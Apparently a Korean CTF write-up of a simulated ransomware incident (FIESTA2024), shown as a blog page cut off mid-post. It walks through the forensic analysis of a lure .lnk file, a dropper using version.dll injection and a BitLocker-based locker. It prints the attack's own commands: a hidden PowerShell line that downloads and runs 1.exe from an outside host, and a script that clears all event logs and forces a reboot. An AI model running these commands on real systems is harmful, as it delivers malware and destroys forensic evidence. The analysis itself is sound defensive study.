<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> FIESTA2024 침해대응 1 풀이 - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="재밌는 랜섬웨어 분석- FIESTA2024 침해대응 1 풀이"> <meta name="keywords" content="FIESTA2024 침해대응 1 풀이, TouBVa, reversing, system_hacking,리버싱, 윈도우 시스템 해킹, CTF"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="FIESTA2024 침해대응 1 풀이" property="og:title" /> <meta content="article" property="og:type" /> <meta content="재밌는 랜섬웨어 분석" property="og:description" /> <meta content="https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1" property="og:url" /> <meta content="2025-02-01T09:21:02-06:00" property="article:published_time" /> <meta content="https://touBVa.github.io/about/" property="article:author" /> <meta content="https://touBVa.github.io/assets/img/posts/2025-02-02-FIESTA2024-cert1/image.png" property="og:image" /> <meta content="reversing" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="FIESTA2024 침해대응 1 풀이" /> <meta name="twitter:url" content="https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1" /> <meta name="twitter:description" content="재밌는 랜섬웨어 분석" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/css/main.css" /> <!-- <link rel="stylesheet" href="https://touBVa.github.io/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="https://touBVa.github.io/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'https://touBVa.github.io' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="https://touBVa.github.io/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="https://touBVa.github.io/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="https://touBVa.github.io/assets/js/search.js"></script> <script src="https://touBVa.github.io/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark nav-down" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <!-- <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/styleguide"> Styleguide </a> </li> --> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <!-- <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> <span class="snipcart-total-price"></span> </a> </li> --> <script type="text/javascript"> var didScroll; var lastScrollTop = 0; var delta = 5; var navbarHeight = document.querySelector('#topNav').offsetHeight; window.addEventListener('scroll', function(event) { didScroll = true; }); setInterval(function() { if (didScroll) { hasScrolled(); didScroll = false; } }, 250); function hasScrolled() { var st = window.pageYOffset || document.documentElement.scrollTop; if (Math.abs(lastScrollTop - st) <= delta) return; var nav = document.querySelector('#topNav'); var prog = document.querySelector('#progress-bar'); if (st > lastScrollTop && st > navbarHeight) { nav.classList.remove('nav-down'); nav.classList.add('nav-up'); prog.classList.remove('toDown'); prog.classList.add('toUp'); } else { if (st < lastScrollTop) { nav.classList.remove('nav-up'); nav.classList.add('nav-down'); prog.classList.remove('toUp'); prog.classList.add('toDown'); } } lastScrollTop = st; } </script> <!-- <li class="nav-item"> <input class="nav-link switch theme-toggle" type="checkbox" name="checkbox" /> </li> --> </ul> </nav> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div><div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">FIESTA2024 침해대응 1 풀이</h1> <h4 class="post-meta">재밌는 랜섬웨어 분석</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="https://touBVa.github.io/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2025-02-01 09:21:02 -0600" itemprop="datePublished" >Feb 1, 2025</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/reversing/2025-02-02-FIESTA2024-cert1" ></span> <div class="post-categories"> Category : <a href="/blog/categories/reversing" >reversing</a > &nbsp; <a href="/blog/categories/system_hacking" >system_hacking</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top " src="https://touBVa.github.io/assets/img/posts/2025-02-02-FIESTA2024-cert1/image.png" alt="" style="height: 50%; width: 50%; display: block; margin-left: auto; margin-right: auto;" /> <br /> <br /> <ul id="markdown-toc"> <li><a href="#0-초기-접근" id="markdown-toc-0-초기-접근">0. 초기 접근</a></li> <li><a href="#1-파일-분석" id="markdown-toc-1-파일-분석">1. 파일 분석</a> <ul> <li><a href="#10-wipingps1" id="markdown-toc-10-wipingps1">1.0. wiping.ps1</a></li> <li><a href="#11-국내코로나19재감염사례현황pdflnk" id="markdown-toc-11-국내코로나19재감염사례현황pdflnk">1.1. 국내코로나19재감염사례현황.pdf.lnk</a></li> <li><a href="#121exe" id="markdown-toc-121exe">1.2.1.exe</a></li> <li><a href="#13-국내코로나19재감염사례현황pdf" id="markdown-toc-13-국내코로나19재감염사례현황pdf">1.3. 국내코로나19재감염사례현황.pdf</a></li> </ul> </li> <li><a href="#2-dll-인젝션을-활용하는-악성코드-분석1exe" id="markdown-toc-2-dll-인젝션을-활용하는-악성코드-분석1exe">2. dll 인젝션을 활용하는 악성코드 분석(1.exe)</a> <ul> <li><a href="#21-시도-내부-스트링-확인" id="markdown-toc-21-시도-내부-스트링-확인">2.1. (시도) 내부 스트링 확인</a></li> <li><a href="#21-암호화-루틴-접근" id="markdown-toc-21-암호화-루틴-접근">2.1. 암호화 루틴 접근</a></li> <li><a href="#22-sub_1400749c0-분석" id="markdown-toc-22-sub_1400749c0-분석">2.2. sub_1400749C0 분석</a></li> </ul> </li> <li><a href="#3-암호화-쉘스크립트-다운로더-분석encexe" id="markdown-toc-3-암호화-쉘스크립트-다운로더-분석encexe">3. 암호화 쉘스크립트 다운로더 분석(enc.exe)</a> <ul> <li><a href="#31-overview" id="markdown-toc-31-overview">3.1. Overview</a></li> <li><a href="#32-sub_405220-분석" id="markdown-toc-32-sub_405220-분석">3.2. sub_405220 분석</a></li> <li><a href="#33-sub_401e80-분석" id="markdown-toc-33-sub_401e80-분석">3.3. sub_401E80 분석</a></li> </ul> </li> <li><a href="#4-암호화-쉘스크립트-분석lockps1" id="markdown-toc-4-암호화-쉘스크립트-분석lockps1">4. 암호화 쉘스크립트 분석(lock.ps1)</a></li> </ul> <p><br /></p> <blockquote> <p><strong>Description :</strong></p> <p>직원 A씨는 어느 날 PC가 랜섬웨어에 감염된 사실을 알게되었다. 랜섬웨어에 의해 잠긴 파티션 속에는 중요한 대외비 자료가 보관 중이었다. 이에 긴급하게 분석을 맡기게 되었고, 당신은 해당 자료를 무사히 복구해야 하는 상황에 처했다.</p> <p><strong>문제 :</strong></p> <p>(1) dll인젝션에 사용된 dll 파일명 (.dll 포함)</p> <p>(2) 비트라커의 평문키</p> <p>(3) 암호화된 파티션 내부 설계도면에 적힌 가격</p> <p>flag 형식 = FIESTA{(1)_(2)_(3)}</p> </blockquote> <p><br /></p> <h1 id="0-초기-접근">0. 초기 접근</h1> <p>처음 알았는데, 이런 식으로 침해당한 OS 이미지를 주면 VM에 띄워보는 게 아니라 FTK Imager에 띄우는 게 정석이었나 보다.</p> <p>전형적인 랜섬웨어 공격이다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image.png" alt="image.png" width="80%" height="80%" /></p> <p>피해자들은 보통 파일을 다운로드 및 실행함으로써 랜섬웨어에 감염된다.</p> <p>따라서 최근에 사용한 파일이 무엇인지 확인해 보았다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%201.png" alt="image.png" width="80%" height="80%" /></p> <p>저 두 개가 진짜 문제 같아 보인다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%202.png" alt="image.png" width="80%" height="80%" /></p> <p>아니나 다를까 해당 파일의 위치로 가 보니 MAC Time이 비슷한 파일 3개가 보인다.</p> <p>해당 파일을 분석 대상으로 결정하고, 이번에는 확장자가 .pdf인 바로 가기 파일을 확보하기 위해 다시 최근 파일로 돌아왔다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%203.png" alt="image.png" width="80%" height="80%" /></p> <p>그러나 해당 바로 가기 파일은 삭제되어 있었다. 악성 행위가 진행되며 흔적이 될 수 있는 파일을 지운 것으로 추정된다.</p> <p>어쨌든 4개 파일을 모두 확보했고, C-TIME과 M-TIME에 기반한 순서 및 이벤트 로거에서 확인한 정보 토대로 가볍게 분석해 보았다.</p> <p><br /></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%204.png" alt="image.png" width="80%" height="80%" /></p> <ul> <li> <p><code class="language-plaintext highlighter-rouge">국내코로나19재감염사례현황.pdf</code></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%205.png" alt="image.png" width="80%" height="80%" /></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">국내코로나19재감염사례현황.pdf.lnk</code></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%206.png" alt="image.png" width="80%" height="80%" /></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">1.exe</code></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%207.png" alt="image.png" width="80%" height="80%" /></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">wiping.ps1</code></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%208.png" alt="image.png" width="80%" height="80%" /></p> </li> </ul> <p><br /></p> <p>이벤트 로거 확인 모습 -경고 로그, 저 시점에 BitLocker 암호화가 되었음</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%209.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p>저 시점 이전에 ID 403(파워쉘 코드 실행 중지) 및 ID 600이 모여 있는 게 보인다.</p> <p>403부터 확인해 보았다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2010.png" alt="image.png" width="80%" height="80%" /></p> <p>wiping.ps1이 실행된 것이 볼륨 암호화와 연관이 있을 확률이 높아 보인다.</p> <p><br /></p> <p>pdf 파일을 열어봄으로써 악성코드가 드롭/다운로드되어 실행되었다는 시나리오일 것으로 추정된다.</p> <p>그리고 저 시점 이전의 이벤트 로그가 싹 지워져 있는데, 이건 악성 행위에 이벤트 로그를 지우는 행위가 포함되어 있기 때문으로 추정된다.</p> <p><br /></p> <h1 id="1-파일-분석">1. 파일 분석</h1> <p><br /></p> <h2 id="10-wipingps1">1.0. wiping.ps1</h2> <p>파워쉘 코드는 가장 분석이 쉽기 때문에 최우선적으로 확인했다.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\Public\lock.ps1"</span><span class="w">

</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$filePath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nv">$filePath</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">el</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">cl</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-Seconds</span><span class="w"> </span><span class="nx">300</span><span class="w">
</span><span class="n">Restart-Computer</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">lock.ps1</code> 파일을 지워버리고</p> <p>이벤트 로그 지우는 게 맞다.</p> <p><br /></p> <h2 id="11-국내코로나19재감염사례현황pdflnk">1.1. 국내코로나19재감염사례현황.pdf.lnk</h2> <p>바로 가기 파일의 동작은 무엇을 가리키는지가 핵심이다.</p> <p>따라서 속성 보기를 통해 무엇을 대상으로 하는지 확인했다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2011.png" alt="image.png" width="80%" height="80%" /></p> <p>파워쉘을 실행하는 링크 파일이다.</p> <p>그런데 좀 이상하다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2012.png" alt="image.png" width="80%" height="80%" /></p> <p>링크 파일이라기엔 너무 크다.</p> <p><br /></p> <p>자세한 내용을 알기 위해 HxD로 내부 내용을 확인했… 는데, HxD는 lnk 자체의 데이터를 보여주는 게 아니라, lnk가 가리키는 파일의 데이터를 보여주더라.</p> <p>010 Editor를 사용했다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2013.png" alt="image.png" width="80%" height="80%" /></p> <p>내부에 커맨드가 있는 것을 확인할 수 있다.</p> <p><br /></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">/c</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-windowstyle</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"Set-Location -Path 'C:\Users\Public'; Invoke-WebRequest -Uri 'http://172.22.224.1:7777/123.pdf' -OutFile 'C:\Users\Public\국내코로나19재감염사례현황.pdf'; Invoke-WebRequest -Uri 'http://172.22.224.1:7777/1.exe' -OutFile 'C:\Users\Public\1.exe'; Start-Process -FilePath 'C:\Users\Public\국내코로나19재감염사례현황.pdf'; Start-Process -FilePath 'C:\Users\Public\1.exe'"</span><span class="w">
</span></code></pre></div></div> <p>pdf 파일과 <code class="language-plaintext highlighter-rouge">1.exe</code>를 다운받아 실행시키는 커맨드다.</p> <p>pdf 파일 자체에 문제가 있을 수도 있지만, 이 경우에는 <code class="language-plaintext highlighter-rouge">1.exe</code>가 드로핑을 위한 DB 정도로 pdf 파일을 사용할 수도 있겠다는 생각이 들었다.</p> <p><br /></p> <h2 id="121exe">1.2.1.exe</h2> <p>Virustotal에 먼저 넣고 돌려 보았다. 샌드박스 프로그램 쓰고 싶은데 맨날 계정 만드는 걸 까먹는다;</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2014.png" alt="image.png" width="80%" height="80%" /></p> <p>대박 개쩌는 악성파일이다</p> <p><br /></p> <p>주요 행위를 정리해 동작 메커니즘을 추론해 보았다.</p> <ol> <li> <p>악성 dll 다운로드</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2015.png" alt="image.png" width="80%" height="80%" /></p> </li> <li>악성 dll injection <ul> <li>dll을 다운로드했기 때문에, 분석 결과에서 <code class="language-plaintext highlighter-rouge">version.dll</code>을 검색해 Files Written에 있는 주요 시스템 파일과 동일한 파일명인지를 확인했다.</li> </ul> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2016.png" alt="image.png" width="80%" height="80%" /></p> </li> <li>자동으로 인터넷 검색 쿠키를 지움 <ul> <li>이는 사용자가 어디에서 악성 파일을 입수했는지 파악이 어렵게 하기 위한 것으로 정</li> </ul> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2017.png" alt="image.png" width="80%" height="80%" /></p> </li> <li>추가 PE 다운로드 <ul> <li>뭔가 저 version[1].dll은 version.dll 인젝션으로 인해 드롭된 파일 같음</li> </ul> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2018.png" alt="image.png" width="80%" height="80%" /></p> </li> <li> <p>(추가 증적) 쉘 커맨드</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2019.png" alt="image.png" width="80%" height="80%" /></p> </li> <li> <p>키 생성 및 암호화</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2020.png" alt="image.png" width="80%" height="80%" /></p> </li> </ol> <p><br /></p> <p>즉, 여기에서 첫 번째 문항을 해결할 수 있다.</p> <blockquote> <p><mark>(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll</mark></p> <p>(2) 비트라커의 평문키</p> <p>(3) 암호화된 파티션 내부 설계도면에 적힌 가격</p> </blockquote> <p><br /></p> <h2 id="13-국내코로나19재감염사례현황pdf">1.3. 국내코로나19재감염사례현황.pdf</h2> <p>해당 파일은 주요 악성 행위를 수행하는 1.exe에서 참조하지 않는 관계로, 확인하지 않음</p> <p><br /> <br /></p> <h1 id="2-dll-인젝션을-활용하는-악성코드-분석1exe">2. dll 인젝션을 활용하는 악성코드 분석(1.exe)</h1> <p>version.dll 인젝션하는 포인트 전후로 뭔가 하겠지..</p> <p>해당 악성코드는 stripped &amp; obfuscated된 악성코드다.</p> <p>근데 샌드박스에서 돌렸을 때 get request를 날리거나, 커맨드라인을 실행하는 모습을 보였음</p> <ul> <li>즉, 내부에 관련 스트링을 가지고 있을 가능성이 높음</li> <li>아니면 인코딩된 스트링을 디코딩하든가</li> <li>그런데 어쨌든 httprequest는 보내겠지</li> </ul> <p>이제 저 순서대로 분석하면 되지 않을까</p> <p><br /></p> <h2 id="21-시도-내부-스트링-확인">2.1. (시도) 내부 스트링 확인</h2> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2021.png" alt="image.png" width="80%" height="80%" /></p> <p>?</p> <p>String Subview 켜자마자 보였음</p> <p>머쓱…</p> <p>그럼 소제목을 다시 써야 할 것 같다</p> <p><br /></p> <h2 id="21-암호화-루틴-접근">2.1. 암호화 루틴 접근</h2> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2021.png" alt="image.png" width="80%" height="80%" /></p> <p>저 스트링을 어디에서 참조하는지 확인해 보자.</p> <p>단순히 단축키 x를 눌러서 xref를 찾는 것만으로는 참조 위치가 나오지 않는다.</p> <p><br /></p> <p>개인적으로 이런 경우에 대한 추측인데,</p> <p>이는 코드에서 다이렉트로 해당 스트링의 시작 주소를 참조하는 게 아닌</p> <p>해당 스트링을 가리키는 타 포인터 변수(<code class="language-plaintext highlighter-rouge">aHttpsGithubCom</code>)를 참조해서 그런 것 같다.</p> <p>xref의 경우 이 스트링을 참조하는 ‘코드’ 포인트를 보여주는 거지 이 스트링을 가리키는 포인터를 보여주는 게 아니라 xref 정보가 없는 것으로 보인다.</p> <p><br /></p> <p>하지만 다 방법이 있다.</p> <p><br /></p> <p>해당 스트링의 위치로 가면 이 스트링의 변수명이 함께 명시되어 있다.</p> <p>그 옆에 있는 DATA XREF 위치가 해당 변수를 참조하는 코드 위치이므로 거기로 가도 좋고</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2022.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p>이 스트링의 주소에 대한 모든 xref 그래프(xref to this address)를 조회할 수도 있다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2023.png" alt="image.png" width="80%" height="80%" /></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2024.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">sub_1400749C0</code> 함수에서 접근함을 알 수 있었다.</p> <p><br /></p> <h2 id="22-sub_1400749c0-분석">2.2. sub_1400749C0 분석</h2> <p>해당 함수를 Disassemble하면 아래와 같은 내용을 확인할 수 있다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2025.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p>와 윈도우 폴더를 두 개 만들어 버리네</p> <p>와 저런 식으로 오버라이드를 해버리네</p> <p><br /></p> <p>그런데 우리가 잊지 말아야 할 게 있음</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2026.png" alt="image.png" width="80%" height="80%" /></p> <p>이 악성파일은 저 깃헙 레포에 수상할 정도로 많이 접근함</p> <p>그리고 이쯤에서 다시 꺼내보는 wiping.ps1</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\Public\lock.ps1"</span><span class="w">

</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$filePath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nv">$filePath</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">el</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">cl</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-Seconds</span><span class="w"> </span><span class="nx">300</span><span class="w">
</span><span class="n">Restart-Computer</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div></div> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">lock.ps1</code>을 삭제한다고 되어 있는데</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2027.png" alt="image.png" width="50%" height="50%" /></p> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">1.exe</code> 내부에 <code class="language-plaintext highlighter-rouge">lock.ps1</code> 문자열은 존재하지 않음.</p> <p><code class="language-plaintext highlighter-rouge">1.exe</code> 의 짜임새를 봤을 때, <code class="language-plaintext highlighter-rouge">lock.ps1</code> 문자열을 따로 인코딩하여 데이터 영역에 넣어두지도 않았을 가능성이 높음</p> <p>즉, <code class="language-plaintext highlighter-rouge">lock.ps1</code>은 어딘가에서 다운로드 되었을 가능성이 높음.</p> <p>높은 확률로 저 <code class="language-plaintext highlighter-rouge">imnothackerkkk</code> 레포일 것이므로, 해당 레포를 뒤져 보았다.</p> <p><br /></p> <ol> <li>imnothackerkkk/key/secret <ol> <li><code class="language-plaintext highlighter-rouge">Giveme the100BTC!!!</code></li> </ol> </li> <li> <p>imnothackerkkk/enc/main</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2028.png" alt="image.png" width="50%" height="50%" /></p> <ul> <li>lock.ps1의 암호화된 버전과 복호화 기반이 될 수 있는 툴을 가지고 있는 것으로 보인다.</li> </ul> </li> <li>imnothacker/secret/hi!!! <ol> <li><code class="language-plaintext highlighter-rouge">CBCAMP{D0Y0UKN0WAboutWebAr71F4C7?}</code></li> <li>이건 뭐지</li> </ol> </li> </ol> <p><br /></p> <p>enc 레포에 접근하는 행위는 현재까지 분석한 파일에서 보이지 않았다.</p> <p>그러나, 암호화의 핵심으로 보이는 <code class="language-plaintext highlighter-rouge">lock.ps1</code> 파일과 관련된 레포이므로 분석해 보았다.</p> <p>(그래서 저 레포에는 언제 어떻게 접근한 거지?)</p> <p><br /> <br /></p> <h1 